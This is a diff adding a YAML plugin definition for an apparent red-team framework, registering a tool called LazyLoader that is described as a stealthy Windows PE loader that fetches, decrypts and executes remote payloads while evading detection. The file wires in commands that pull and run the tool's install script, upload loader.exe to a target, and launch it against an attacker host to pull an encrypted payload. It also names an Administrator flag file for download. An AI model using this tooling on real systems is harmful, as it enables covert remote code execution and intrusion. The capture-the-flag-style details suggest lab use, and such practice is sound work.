@@ -1,0 +1,21 @@
+name: LazyLoader
+description: >
+  LazyLoader is A stealthy LazyLoader Windows PE loader designed to fetch, decrypt, and execute payloads remotely while evading detection. usage like this .\loader 10.10.14.91 80 cipher.bin key.bin
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+tool:
+  name: LazyLoader
+  repo_url: https://github.com/grisuno/LazyLoader.git
+  install_path: external/.exploit/LazyLoader
+  install_command: git restore . ; git pull ; chmod +x *.sh ; ./install.sh
+  execute_command: git restore . ; git pull ; chmod +x *.sh ; ./install.sh
+  download_file: C:\Users\Administrator\Desktop\root.txt
+  upload_file: windows ./external/.exploit/LazyLoader/loader.exe
+  lazycommand: >-
+    aes_pe, encodewinbase64 .\loader {lhost} 80 cipher.bin key.bin
